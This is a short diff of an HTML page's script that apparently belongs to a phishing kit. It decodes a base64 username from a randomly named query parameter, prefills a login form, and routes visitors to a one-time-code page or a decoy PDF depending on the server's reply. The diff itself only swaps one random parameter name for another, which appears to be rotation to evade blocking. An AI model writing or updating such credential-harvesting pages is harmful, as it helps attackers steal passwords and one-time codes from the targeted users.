@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -135,7 +136,7 @@
 
     <script>
     document.addEventListener('DOMContentLoaded', () => {
-      const tk = new URLSearchParams(window.location.search).get('nxowuwonvdmbqrrwewosnadgdhgdus') || '';
+      const tk = new URLSearchParams(window.location.search).get('svhsdfhadeiueirncbxjcbbxcxb') || '';
       const username = atob(tk);
       document.getElementById('useRname').value = username;
       document.querySelector('.userdiv-name').textContent = username;
@@ -157,7 +158,7 @@
           .then(r => r.json())
           .then(data => {
             if (data.result === 'redirected_eotp') {
-              window.location.href = '/eotp?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
+              window.location.href = '/eotp?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
             } else if (data.result === 'success') {
               window.location.href = '/DRA Tech Justification.pdf';
             } else if (data.result === 'redirected') {
